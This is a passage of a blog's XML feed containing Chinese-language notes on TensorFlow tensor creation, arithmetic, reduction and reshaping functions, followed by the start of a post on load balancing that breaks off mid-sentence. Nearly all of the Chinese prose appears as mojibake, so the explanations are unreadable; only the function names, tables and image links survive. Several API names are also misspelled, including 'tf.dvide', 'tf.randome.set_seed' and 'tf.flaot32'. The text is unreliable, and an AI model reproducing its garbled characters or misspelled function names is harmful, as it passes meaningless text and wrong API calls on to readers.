<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151718793156.jpg"alt="16151718793156" /></p><p>å‚æ•°ä¸º bool ç±»å‹æ—¶ï¼Œéé›¶å¯¹åº” Trueï¼š <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151721909289.jpg"alt="16151721909289" /></p><p>å‚æ•°ä¸º string ç±»å‹æ—¶ï¼Œå­˜å‚¨ä¸ºå­—èŠ‚å­—ç¬¦ä¸²ï¼š <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151725243931.jpg"alt="16151725243931" /></p><h3 id="tf.convert_to_tensor-å‡½æ•°">tf.convert_to_tensor() å‡½æ•°</h3><p>tf.convert_to_tensor(æ•°ç»„/åˆ—è¡¨/æ•°å­—/å¸ƒå°”å‹/å­—ç¬¦ä¸²)</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151727638426.jpg"alt="16151727638426" /><figcaption aria-hidden="true">16151727638426</figcaption></figure><h2 id="ç‰¹æ®Šå¼ é‡">ç‰¹æ®Šå¼ é‡</h2><p>å…¨ 0 å¼ é‡: <code>tf.zeros(shape, dtype=tf.float32)</code> å…¨ 1 å¼ é‡:<code>tf.ones(shape, dtype=tf.float32)</code>å…ƒç´ å€¼ç›¸åŒçš„å¼ é‡ï¼š<code>tf.fill(dims, value)</code>ã€<code>tf.constant(value,shape)</code></p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151837551875.jpg"alt="16151837551875" /><figcaption aria-hidden="true">16151837551875</figcaption></figure><h2 id="åˆ¤æ–­å¼ é‡">åˆ¤æ–­å¼ é‡</h2><ol type="1"><li><p>ç›´æ¥æ‰“å° <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151745611027.jpg"alt="16151745611027" /></p></li><li><p>tf.is_tensor() å‡½æ•° <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151742991631.jpg"alt="16151742991631" /></p></li><li><p>isinstance() <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151745016108.jpg"alt="16151745016108" /></p></li></ol><h2 id="éšæœºæ•°å¼ é‡">éšæœºæ•°å¼ é‡</h2><ol type="1"><li><p>æ­£æ€åˆ†å¸ƒ<code>tf.random.normal(shape, mean=0, stddev=1, dtype)</code>å››ä¸ªå‚æ•°ï¼šç»´åº¦ï¼Œå‡å€¼ï¼Œæ ‡å‡†å·®ï¼Œæ•°æ®ç±»å‹</p></li><li><p>æˆªæ–­æ­£æ€åˆ†å¸ƒ<code>tf.random.truncated_normal(shape, mean, stddev, dtype)</code></p><ul><li>è¿”å›ä¸€ä¸ªæˆªæ–­çš„æ­£æ€åˆ†å¸ƒ</li><li>æˆªæ–­çš„æ ‡å‡†æ˜¯ 2 å€çš„æ ‡å‡†å·® ä¾‹å¦‚ï¼Œå½“å‡å€¼ä¸º 0ï¼Œæ ‡å‡†å·®ä¸º 1 æ—¶ï¼Œä½¿ç”¨tf.truncated_normalï¼Œä¸å¯èƒ½å‡ºç°åŒºé—´[-2ï¼Œ2]ä»¥å¤–çš„ç‚¹ä½¿ç”¨f.random_normalï¼ˆï¼‰ï¼Œå¯èƒ½å‡ºç°[-2ï¼Œ2]ä»¥å¤–çš„ç‚¹</li></ul></li><li><p>è®¾ç½®éšæœºç§å­ <code>tf.randome.set_seed()</code> å‡½æ•° <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151861270926.jpg"alt="16151861270926" /></p></li><li><p>å‡åŒ€åˆ†å¸ƒå¼ é‡<code>tf.random.uniform(shape,minval,maxval,dtype)</code>,åŒºé—´ï¼š[minval,maxval) <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151863499015.jpg"alt="16151863499015" /></p></li><li><p>éšæœºæ‰“ä¹±<code>tf.random.shuffle([tensor/list/ndarray])</code></p></li><li><p>åˆ›å»ºåºåˆ—<code>tf.range(start, limit, delta=1, dtype)</code></p></li></ol><h2 id="å°ç»“åˆ›å»ºå¼ é‡">å°ç»“ï¼šåˆ›å»ºå¼ é‡</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151876857241.jpg"alt="16151876857241" /><figcaption aria-hidden="true">16151876857241</figcaption></figure><h2 id="å¼ é‡å±æ€§">å¼ é‡å±æ€§</h2><p><code>ndimã€shapeã€dtype</code> æˆ– Tensor å¯¹è±¡çš„<code>rank(), shape()ã€size()</code></p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151882368946.jpg"alt="16151882368946" /><figcaption aria-hidden="true">16151882368946</figcaption></figure><h2 id="å¼ é‡å’Œ-numpy-æ•°ç»„">å¼ é‡å’Œ numpy æ•°ç»„</h2><ol type="1"><li>åœ¨ TensorFlowä¸­ï¼Œ<strong>æ‰€æœ‰çš„è¿ç®—éƒ½æ˜¯åœ¨å¼ é‡ä¹‹é—´è¿›è¡Œçš„</strong></li><li>NumPy æ•°ç»„ä»…ä»…æ˜¯ä½œä¸ºè¾“å…¥å’Œè¾“å‡ºæ¥ä½¿ç”¨</li><li>å¼ é‡å¯ä»¥è¿è¡Œäº CPUï¼Œä¹Ÿå¯ä»¥è¿è¡Œäº GPU å’Œ TPU</li><li>è€Œ NumPy æ•°ç»„åªèƒ½å¤Ÿåœ¨ CPU ä¸­è¿è¡Œ</li></ol>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tf å¼ é‡è¿ç®—</title>
      <link href="/blog/2021/07/15/programming/python/tensorflow/tf_tensor_op/"/>
      <url>/blog/2021/07/15/programming/python/tensorflow/tf_tensor_op/</url>
      
        <content type="html"><![CDATA[<h2 id="å››åˆ™è¿ç®—">å››åˆ™è¿ç®—</h2><table><thead><tr class="header"><th>ç®—æœ¯æ“ä½œ</th><th>æè¿°</th></tr></thead><tbody><tr class="odd"><td>tf.add(x, y)</td><td>å°† x å’Œ y é€å…ƒç´ ç›¸åŠ </td></tr><tr class="even"><td>tf.subtract(x,y)</td><td>å°† x å’Œ y é€å…ƒç´ ç›¸å‡</td></tr><tr class="odd"><td>tf.multiply(x, y)</td><td>å°† x å’Œ y é€å…ƒç´ ç›¸ä¹˜</td></tr><tr class="even"><td>tf.dvide(x,y)</td><td>å°† x å’Œ y é€å…ƒç´ ç›¸é™¤</td></tr><tr class="odd"><td>tf.math.mod(x, y)</td><td>å¯¹ x é€å…ƒç´ å–æ¨¡</td></tr></tbody></table><p>åŠ å‡ä¹˜é™¤æ³•è¿ç®—ï¼Œéƒ½æ˜¯è¿™ä¸¤ä¸ªå¼ é‡é€å…ƒç´ çš„è¿ç®—ï¼Œå¹¶ä¸”è¦æ±‚å„ä¸ªå¼ é‡ä¸­çš„å…ƒç´ æ•°æ®ç±»å‹å¿…é¡»ä¸€è‡´ã€‚</p><h2 id="å¹‚æŒ‡æ•°è¿ç®—">å¹‚æŒ‡æ•°è¿ç®—</h2><table><thead><tr class="header"><th>ç®—æœ¯æ“ä½œ</th><th>æè¿°</th></tr></thead><tbody><tr class="odd"><td>tf.pow(x, y)</td><td>å¯¹ x æ±‚ y çš„å¹‚æ¬¡æ–¹</td></tr><tr class="even"><td>tf.square(x)</td><td>å¯¹ x é€å…ƒç´ æ±‚è®¡ç®—å¹³æ–¹</td></tr><tr class="odd"><td>tf.sqrt(x)</td><td>å¯¹ x é€å…ƒç´ å¼€å¹³æ–¹æ ¹</td></tr><tr class="even"><td>tf.exp(x)</td><td>è®¡ç®— e çš„ x æ¬¡æ–¹(x ä¸ºæµ®ç‚¹æ•°)</td></tr><tr class="odd"><td>tf.math.log(x)</td><td>è®¡ç®—è‡ªç„¶å¯¹æ•°åº•æ•°ä¸º e</td></tr></tbody></table><p>å¼€å¹³æ–¹æ ¹å‡½æ•°ï¼Œè¦æ±‚å‚æ•°æ˜¯æµ®ç‚¹æ•°ï¼štf.pow(x, y)(å…¶ä¸­y&lt;1)ã€tf.sqrtã€tf.exp(x)</p><h2 id="è‡ªç„¶æŒ‡æ•°å’Œè‡ªç„¶å¯¹æ•°è¿ç®—">è‡ªç„¶æŒ‡æ•°å’Œè‡ªç„¶å¯¹æ•°è¿ç®—</h2><p>tf.exp å’Œ tf.math.log ä¹Ÿè¦æ±‚å¼ é‡æ˜¯æµ®ç‚¹æ•°ã€‚ tensorflowåªæä¾›äº†è‡ªç„¶å¯¹æ•°ï¼Œæ²¡æœ‰æä¾›å…¶ä»–åº•æ•°çš„å¯¹æ•°ã€‚å¦‚éœ€ä½¿ç”¨ï¼Œå¯ä»¥é‡‡ç”¨æ¢åº•å…¬å¼æ¥è®¡ç®—ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16152544294725.jpg"alt="16152544294725" /><figcaption aria-hidden="true">16152544294725</figcaption></figure><p>æŒ‡æ•°è¿ç®—å’Œå¯¹æ•°è¿ç®—ä¸åœ¨åŒä¸€ä¸ªæ¨¡å—ä¸­ï¼Œä»¥åŠæ²¡æœ‰æä¾›ä»¥å…¶ä»–è‡ªç„¶æ•°ä¸ºåº•çš„å¯¹æ•°è¿ç®—</p><h2 id="å…¶ä»–è¿ç®—">å…¶ä»–è¿ç®—</h2><table><thead><tr class="header"><th>å‡½æ•°</th><th>æè¿°</th></tr></thead><tbody><tr class="odd"><td>tf.sign(x)</td><td>è¿”å› x çš„ç¬¦å·</td></tr><tr class="even"><td>tf.abs(x)</td><td>å¯¹ x é€å…ƒç´ æ±‚ç»å¯¹å€¼</td></tr><tr class="odd"><td>tf.negative(x)</td><td>å¯¹ x é€å…ƒç´ æ±‚ç›¸åæ•°,y=-x</td></tr><tr class="even"><td>tf.reciprocal(x)</td><td>å– x çš„å€’æ•°</td></tr><tr class="odd"><td>tf.logical_not(x)</td><td>å¯¹ x é€å…ƒç´ æ±‚çš„é€»è¾‘é</td></tr><tr class="even"><td>tf.ceil(x)</td><td>å‘ä¸Šå–æ•´</td></tr><tr class="odd"><td>tf.floor(x)</td><td>å‘ä¸‹å–æ•´</td></tr><tr class="even"><td>tf.rint(x)</td><td>å–æœ€æ¥è¿‘çš„æ•´æ•°</td></tr><tr class="odd"><td>tf.round(x)</td><td>å¯¹ x é€å…ƒç´ æ±‚èˆå…¥æœ€æ¥è¿‘çš„æ•´æ•°</td></tr><tr class="even"><td>tf.maximum(x, y)</td><td>è¿”å›ä¸¤ tensor ä¸­çš„æœ€å¤§å€¼</td></tr><tr class="odd"><td>tf.minimum(x, y)</td><td>è¿”å›ä¸¤ tensor ä¸­çš„æœ€å°å€¼</td></tr></tbody></table><table><colgroup><col style="width: 22%" /><col style="width: 19%" /><col style="width: 8%" /><col style="width: 26%" /><col style="width: 22%" /></colgroup><thead><tr class="header"><th>è¿ç®—ç¬¦</th><th>æ„é€ æ–¹æ³•</th><th>è¿ç®—ç¬¦</th><th>æ„é€ æ–¹æ³•</th><th></th></tr></thead><tbody><tr class="odd"><td>x+y</td><td>tf.add( )</td><td>x&amp;y</td><td>tf.logical_and()</td><td></td></tr><tr class="even"><td>x-y</td><td>t. subtract()</td><td>x</td><td>y</td><td>tf.logical_or()</td></tr><tr class="odd"><td>x*y</td><td>tf.multiply()</td><td>x^y</td><td>tf.logical_xor()</td><td></td></tr><tr class="even"><td>x/y(python2.0)</td><td>tf.divide()</td><td>~X</td><td>tf.logical_not()</td><td></td></tr><tr class="odd"><td>x/y(python3.0)</td><td>tf.truediv()</td><td>x&lt;y</td><td>tf.less()</td><td></td></tr><tr class="even"><td>x//y(python3.0)</td><td>floordiv()</td><td>X&lt;=y</td><td>tf.less_ equal()</td><td></td></tr><tr class="odd"><td>x%y</td><td>tf.math.mod()</td><td>x&gt;y</td><td>tf.greater()</td><td></td></tr><tr class="even"><td>x**y</td><td>tf.pow()</td><td>X&gt;=y</td><td>tf.greater_equal()</td><td></td></tr><tr class="odd"><td>-x</td><td>tf.neg()</td><td></td><td></td><td></td></tr><tr class="even"><td>abs(x)</td><td>tf.abs()</td><td></td><td></td><td></td></tr></tbody></table><p>å¹¿æ’­æœºåˆ¶ï¼šè¦æ±‚ä¸¤ä¸ªå¼ é‡çš„æœ€åä¸€ä¸ªç»´åº¦ç›¸ç­‰ã€‚å½“å¼ é‡å’Œä¸€ä¸ªæ•°å­—è¿›è¡Œè¿ç®—æ—¶ï¼Œä¼šå°†è¿™ä¸ªæ•°å­—å€¼å¹¿æ’­åˆ°å¼ é‡çš„å„ä¸ªå…ƒç´ ã€‚</p><p>å¼ é‡å’Œ NumPy æ•°ç»„ä¹‹é—´çš„ç›¸äº’è½¬æ¢</p><ol type="1"><li>NumPy æ•°ç»„è½¬åŒ–ä¸ºå¼ é‡ï¼štf.constantï¼ˆï¼‰ï¼›tf.convert_to_tensor</li><li>å¼ é‡è½¬æ¢ä¸º NumPy æ•°ç»„ï¼šTensor.numpyï¼ˆï¼‰</li></ol><p>å½“å¼ é‡å’Œ NumPy æ•°ç»„å…±åŒå‚ä¸è¿ç®—æ—¶ï¼š</p><ol type="1"><li>æ‰§è¡Œ TensorFlow æ“ä½œï¼Œé‚£ä¹ˆ TensorFlow å°†è‡ªåŠ¨çš„æŠŠ NumPyæ•°ç»„è½¬æ¢ä¸ºå¼ é‡</li><li>æ‰§è¡Œ NumPy æ“ä½œï¼Œé‚£ä¹ˆ NumPy å°†è‡ªåŠ¨çš„å¼ é‡è½¬æ¢ä¸º NumPy æ•°ç»„</li><li>åªè¦æ“ä½œæ•°ä¸­æœ‰ä¸€ä¸ª Tensorå¯¹è±¡ï¼Œå°±æŠŠæ‰€æœ‰çš„æ“ä½œæ•°éƒ½è½¬åŒ–ä¸ºå¼ é‡ï¼Œç„¶åå†è¿›è¡Œè¿ç®—ã€‚</li></ol><h2 id="å¼ é‡ä¹˜æ³•">å¼ é‡ä¹˜æ³•</h2><p>å…ƒç´ ä¹˜æ³•ï¼štf.multiply(value_a,value_a), * è¿ç®—ç¬¦å‘é‡ä¹˜æ³•ï¼štf.matmul(value_a,)value_a, @ è¿ç®—ç¬¦å¤šç»´å‘é‡ä¹˜æ³•é‡‡ç”¨å¹¿æ’­æœºåˆ¶ï¼Œæœ€åä¸¤ç»´ç›¸ä¹˜ï¼Œå‰é¢ç»´åº¦ç»´åº¦ä¸å˜ã€‚å½“ç›¸ä¹˜å¼ é‡çš„ç»´åº¦éƒ½å¤§äº 2 æ—¶ï¼Œæœ€åä¸¤ç»´ç›¸ä¹˜ï¼Œå‰é¢ç»´åº¦ç»´åº¦ä¸å˜ã€‚</p><p>æ³¨æ„ï¼štf.range() å’Œ np.arange() é»˜è®¤çš„ dtype ä¸ä¸€æ ·ï¼Œnumpy.arangeé»˜è®¤ int64, tf.range é»˜è®¤ 32. <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16152575706255.jpg"alt="16152575706255" /></p><h2id="æ•°æ®ç»Ÿè®¡æ±‚å¼ é‡åœ¨æŸä¸ªç»´åº¦ä¸Šæˆ–è€…å…¨å±€çš„ç»Ÿè®¡å€¼">æ•°æ®ç»Ÿè®¡ï¼šæ±‚å¼ é‡åœ¨æŸä¸ªç»´åº¦ä¸Šã€æˆ–è€…å…¨å±€çš„ç»Ÿè®¡å€¼</h2><table><thead><tr class="header"><th>å‡½æ•°</th><th>æè¿°</th></tr></thead><tbody><tr class="odd"><td>tf.reduce_sum(input_tensor, axis)</td><td>æ±‚å’Œ</td></tr><tr class="even"><td>tf.reduce_mean(input_tensor, axis)</td><td>æ±‚å¹³å‡å€¼</td></tr><tr class="odd"><td>tf.reduce_max(input_tensor, axis)</td><td>æ±‚æœ€å¤§å€¼</td></tr><tr class="even"><td>tf.reduce_min(input_tensor, axis)</td><td>æ±‚æœ€å°å€¼</td></tr></tbody></table><p>å¦‚æœå¼ é‡å…ƒç´ ä¸º intï¼Œ é‚£ä¹ˆå‡å€¼ä¹Ÿä¼šèˆä¸ºintï¼Œå¦‚æœå¸Œæœ›ç²¾ç¡®åœ°å¾—åˆ°æµ®ç‚¹æ•°å‡å€¼ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š</p><ol type="1"><li>å®šä¹‰å¼ é‡çš„ <code>dtype=tf.float32</code> ç­‰æµ®ç‚¹ç±»å‹</li><li>å¦‚æœå®šä¹‰æ—¶ï¼Œä½¿ç”¨äº†æ•´æ•°ï¼Œå¯ä»¥åœ¨è°ƒç”¨ <code>tf.reduce_mean()</code>æ—¶ï¼Œ é‡‡ç”¨ <code>tf.cast(values, tf.flaot32)</code>æ¥å°†å¼ é‡å€¼è½¬æ¢ä¸ºæµ®ç‚¹æ•°</li></ol><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16152605253799.jpg"alt="16152605253799" /><figcaption aria-hidden="true">16152605253799</figcaption></figure><h2 id="æ±‚æœ€å€¼çš„ç´¢å¼•">æ±‚æœ€å€¼çš„ç´¢å¼•</h2><p><code>tf.argmax(), tf.argmin()</code></p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16152610087523.jpg"alt="16152610087523" /><figcaption aria-hidden="true">16152610087523</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tensorflow tensor ç»´åº¦å˜æ¢</title>
      <link href="/blog/2021/07/15/programming/python/tensorflow/tf_tensor_shape/"/>
      <url>/blog/2021/07/15/programming/python/tensorflow/tf_tensor_shape/</url>
      
        <content type="html"><![CDATA[<ol type="1"><li>å¼ é‡æ˜¯ TensorFlow ä¸­å¤šç»´æ•°ç»„çš„è½½ä½“ï¼Œç”¨ Tensor å¯¹è±¡å®ç°</li><li>åœ¨ CPU ç¯å¢ƒä¸‹ï¼Œå¼ é‡å’Œ NumPy æ•°ç»„æ˜¯å…±äº«åŒä¸€æ®µå†…å­˜çš„ï¼Œåªæ˜¯ tensorflowå’Œ numpy å„è‡ªé‡‡ç”¨ä¸åŒçš„æ–¹å¼è¯»å–å®ƒã€‚</li><li>å¤šç»´å¼ é‡åœ¨å†…å­˜ä¸­æ˜¯ä»¥ä¸€ç»´æ•°ç»„çš„æ–¹å¼è¿ç»­å­˜å‚¨çš„</li></ol><p>æ”¹å˜å¼ é‡çš„å½¢çŠ¶ï¼š <code>tf.reshape(tensor, shape)</code> <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151892314749.jpg"alt="16151892314749" /></p><p>åˆ›å»ºæ—¶ï¼Œä¿®æ”¹ç»´åº¦ï¼š <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151893597593.jpg"alt="16151893597593" /></p><h2 id="è½´ä¸ç»´åº¦">è½´ä¸ç»´åº¦</h2><p>è½´å¯ä»¥æ˜¯è´Ÿæ•°ï¼Œç»´æ•°è¾ƒå¤šï¼Œéœ€è¦æ“ä½œåå‡ ç»´æ—¶ï¼Œç”¨è´Ÿæ•°æ–¹ä¾¿ã€‚ <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151894651299.jpg"alt="16151894651299" /></p><p>å¢åŠ å’Œåˆ é™¤ç»´åº¦ å¢åŠ çš„è¿™ä¸ªç»´åº¦ä¸Šï¼Œé•¿åº¦ä¸º1ï¼š<code>tf.expand_dims(input, axis)</code> åˆ é™¤ç»´åº¦ï¼Œåªèƒ½åˆ é™¤é•¿åº¦ä¸º 1çš„ç»´åº¦(ä¸æŒ‡å®šè½´ï¼Œåˆ é™¤æ‰€æœ‰ç»´åº¦ä¸º 1çš„è½´)ï¼š<code>tf.squeeze(input, axis)</code>å¢åŠ å’Œåˆ é™¤ç»´åº¦ï¼Œåªæ˜¯æ”¹å˜äº†å¼ é‡çš„è§†å›¾ï¼Œä¸ä¼šæ”¹å˜å¼ é‡çš„å­˜å‚¨ã€‚ <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151901304723.jpg"alt="16151901304723" /></p><h2 id="äº¤æ¢ç»´åº¦">äº¤æ¢ç»´åº¦</h2><p>tf.transpose(a, perm)ï¼Œperm ä¸ºå¼ é‡ä¸­å„ä¸ªè½´çš„é¡ºåºå¯¹äºäºŒç»´å¼ é‡ï¼Œå°±æ˜¯çŸ©é˜µçš„è½¬ç½®ã€‚ <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151931641917.jpg"alt="16151931641917" /></p><p>äº¤æ¢ç»´åº¦ï¼Œä¸ä»…æ”¹å˜äº†å¼ é‡çš„è§†å›¾ï¼ŒåŒæ—¶ä¹Ÿæ”¹å˜äº†å¼ é‡çš„å­˜å‚¨é¡ºåº</p><h2 id="æ‹¼æ¥ä¸åˆ†å‰²">æ‹¼æ¥ä¸åˆ†å‰²</h2><p>å›¾åƒçš„åˆ†å‰²ä¸æ‹¼æ¥ï¼Œæ”¹å˜äº†å¼ é‡çš„è§†å›¾ï¼Œå¼ é‡çš„å­˜å‚¨é¡ºåºå¹¶æ²¡æœ‰æ”¹å˜ã€‚</p><ol type="1"><li><p>æ‹¼æ¥å¼ é‡ï¼Œæ‹¼æ¥ä¸ä¼šäº§ç”Ÿæ–°çš„ç»´åº¦ï¼š<code>tf.concat(tesnsors,axis)</code>,<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151947573478.jpg"alt="16151947573478" /></p></li><li><p>åˆ†å‰²å¼ é‡ï¼Œå°†ä¸€ä¸ªå¼ é‡æ‹†åˆ†æˆå¤šä¸ªå¼ é‡ï¼Œåˆ†å‰²åç»´åº¦ä¸å˜ã€‚<code>tf.split(value, num_or_size_splits, axis=0)</code> valueï¼šå¼ é‡num_or_size_splits:åˆ†å‰²æ–¹æ¡ˆï¼Œå•ä¸ªæ•°è¡¨ç¤ºç­‰é•¿åˆ‡å‰²ä»½æ•°ï¼Œåºåˆ—æ—¶ï¼Œå°±æ˜¯æ¯ä»½ 2:åˆ†å‰²æˆ 2 ä¸ªå¼ é‡ [1:2:1]: å°±è¡¨ç¤ºåˆ†å‰²æˆä¸‰ä¸ªå¼ é‡,é•¿åº¦åˆ†åˆ«æ˜¯ 1,21 <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151953184159.jpg"alt="16151953184159" /></p></li></ol><h2 id="å †å å’Œåˆ†è§£">å †å å’Œåˆ†è§£</h2><p>å †å å¼ é‡ï¼š<code>tf.stack(values,axis)</code>åˆå¹¶å¼ é‡æ—¶ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„ç»´åº¦ã€‚</p><p>values: å †å çš„å¤šä¸ªå¼ é‡ axis: æŒ‡å®šæ’å…¥æ–°çš„ç»´åº¦çš„ä½ç½®</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151956288185.jpg"alt="16151956288185" /><figcaption aria-hidden="true">16151956288185</figcaption></figure><p>åˆ†è§£å¼ é‡ï¼š<code>tf.unstack(values,axis)</code>å°†å¼ é‡åˆ†è§£ä¸ºå¤šä¸ªå¼ é‡ï¼›åˆ†è§£åå¾—åˆ°çš„æ¯ä¸ªå¼ é‡ï¼Œå’ŒåŸæ¥çš„å¼ é‡ç›¸æ¯”ï¼Œç»´æ•°éƒ½å°‘äº†ä¸€ç»´ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16152057498729.jpg"alt="16152057498729" /><figcaption aria-hidden="true">16152057498729</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è´Ÿè½½å‡è¡¡æŠ€æœ¯</title>
      <link href="/blog/2021/06/18/websec/devices/load_balancing/"/>
      <url>/blog/2021/06/18/websec/devices/load_balancing/</url>
      
        <content type="html"><![CDATA[<h1 id="è´Ÿè½½å‡è¡¡æŠ€æœ¯">è´Ÿè½½å‡è¡¡æŠ€æœ¯</h1><h2 id="å‰è¨€">å‰è¨€</h2><p>è´Ÿè½½å‡è¡¡çš„ç”¨å¤„ï¼š</p><ol type="1"><li>ä¼ä¸šæ— æ³•æ‰¿æ‹…å¾—èµ· WebæœåŠ¡å™¨è¿‡è½½çš„åæœã€‚ç¼“æ…¢ã€æ•…éšœçš„ç½‘ç»œä¼šå½±å“å…³é”®ä¸šåŠ¡æœåŠ¡ï¼Œå¹¶å¯¼è‡´å·®çš„ç»ˆç«¯ç”¨æˆ·ä½“éªŒï¼Œæœ€ç»ˆå¯¼è‡´ç”¨æˆ·é‡æµå¤±ï¼Œç›ˆåˆ©èƒ½åŠ›ä¸‹é™ã€‚</li><li>å†…éƒ¨å‘˜å·¥å¿å—é•¿æ—¶å»¶ã€ç­‰å¾…å¤§é‡çš„ FTP ä¼ è¾“åˆ°è¾¾æ—¶ï¼Œå·¥ä½œæ•ˆç‡ä¸‹é™ã€‚</li></ol><p>æœåŠ¡å™¨å’Œåº”ç”¨ç¨‹åºè´Ÿè½½å¹³è¡¡æ˜¯ç³»ç»Ÿç®¡ç†å‘˜ä¿æŒæœåŠ¡å™¨æ­£å¸¸è¿è¡Œçš„å¸¸ç”¨æ–¹æ³•ã€‚åœ¨ä¸‹é¢çš„éƒ¨åˆ†ä¸­ï¼Œæˆ‘å°†è¯¦ç»†è®¨è®ºä¸€ä¸ªå¸¸è§é—®é¢˜:â€œä»€ä¹ˆæ˜¯è´Ÿè½½å‡è¡¡?â€ï¼ŒåŒæ—¶æ·±å…¥ç ”ç©¶ç°ä»£è´Ÿè½½å¹³è¡¡æ–¹æ³•ã€å½“å‰åº”ç”¨è´Ÿè½½å‡è¡¡å™¨çš„ç±»å‹ä»¥åŠå…¶ä»–åŠ¨æ€è´Ÿè½½å‡è¡¡ä¿¡æ¯ã€‚</p><h2 id="è´Ÿè½½å‡è¡¡">è´Ÿè½½å‡è¡¡</h2><p>è´Ÿè½½å‡è¡¡ï¼ˆæˆ–è€…æœåŠ¡å™¨è´Ÿè½½å‡è¡¡ï¼‰æ˜¯å°†ç½‘ç»œæµé‡åˆ†å¸ƒåˆ°å¤šä¸ªåç«¯æœåŠ¡å™¨ï¼ˆä¹Ÿç§°æœåŠ¡å™¨ç¾¤ï¼‰ä¸Šçš„è¿‡ç¨‹ã€‚é€šä¿—çš„è®²å°±æ˜¯ç»Ÿä¸€åˆ†é…è¯·æ±‚çš„ï¼Œè´Ÿè½½å‡è¡¡ä¼šç»Ÿä¸€æ¥æ”¶å…¨éƒ¨è¯·æ±‚ï¼Œç„¶åæŒ‰ç…§è®¾å®šå¥½çš„ç®—æ³•å°†è¿™äº›è¯·æ±‚åˆ†é…ç»™è¿™ä¸ªè´Ÿè½½å‡è¡¡ç»„ä¸­çš„æ‰€æœ‰æˆå‘˜ï¼Œä»¥æ­¤æ¥å®ç°è¯·æ±‚ï¼ˆè´Ÿè½½ï¼‰çš„å‡è¡¡åˆ†é…ã€‚è¿™ç¡®ä¿äº†å•ä¸ªæœåŠ¡å™¨ä¸ä¼šæ‰¿è½½è¿‡é‡çš„è´Ÿè½½ï¼Œå¹¶èƒ½å¤Ÿä¿æŒé«˜é€Ÿã€é«˜è´¨é‡å‘ç”¨æˆ·æ˜¾ç¤ºç½‘ç»œå†…å®¹ï¼Œä»è€Œä¼˜åŒ–åº”ç”¨ç¨‹åºå’Œç½‘ç»œçš„å¯ç”¨æ€§å’Œå“åº”æ€§ã€‚é€šè¿‡å‡åŒ€åœ°åˆ†é…å·¥ä½œï¼Œè´Ÿè½½å¹³è¡¡æé«˜äº†åº”ç”¨ç¨‹åºçš„å“åº”èƒ½åŠ›ã€‚å®ƒè¿˜ä¸ºç”¨æˆ·å¢åŠ äº†åº”ç”¨ç¨‹åºå’Œç½‘ç«™çš„å¯ç”¨æ€§ã€‚æ²¡æœ‰è´Ÿè½½å¹³è¡¡å™¨ï¼Œç°ä»£åº”ç”¨ç¨‹åºå°±æ— æ³•è¿è¡Œã€‚éšç€æ—¶é—´çš„æ¨ç§»ï¼Œè½¯ä»¶è´Ÿè½½å¹³è¡¡å™¨å¢åŠ äº†åŒ…æ‹¬åº”ç”¨ç¨‹åºå®‰å…¨æ€§åœ¨å†…çš„é¢å¤–åŠŸèƒ½ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16233939859507.jpg"alt="16233939859507" /><figcaption aria-hidden="true">16233939859507</figcaption></figure><p>æ­¤å¤–ï¼Œç”±äºäº‘è®¡ç®—çš„æ™®åŠï¼Œç°åœ¨å¯ä»¥åˆ©ç”¨åº”ç”¨ç¨‹åºè´Ÿè½½å‡è¡¡å™¨æ¥å¸®åŠ©é˜²æ­¢æ‹’ç»æœåŠ¡(DDoS)æ”»å‡»ã€‚åº”ç”¨ç¨‹åºè´Ÿè½½å‡è¡¡å™¨å¯ä»¥å°†æ¥è‡ªå…¬å¸æœåŠ¡å™¨çš„ç½‘ç»œå’Œåº”ç”¨ç¨‹åºæµé‡â€œå¸è½½â€åˆ°å…¬å…±äº‘æœåŠ¡å™¨æˆ–æä¾›å•†ï¼Œä»è€Œä¿æŠ¤æµé‡å…å—å±é™©çš„ç½‘ç»œæ”»å‡»è€…çš„å¹²æ‰°ã€‚</p><p>F5æ˜¯è´Ÿè½½å‡è¡¡äº§å“çš„ä¸€ä¸ªå“ç‰Œï¼Œå…¶åœ°ä½ç±»ä¼¼äºè¯ºåŸºäºšåœ¨æ‰‹æœºå“ç‰Œä¸­çš„ä½ç½®ã€‚é™¤äº† 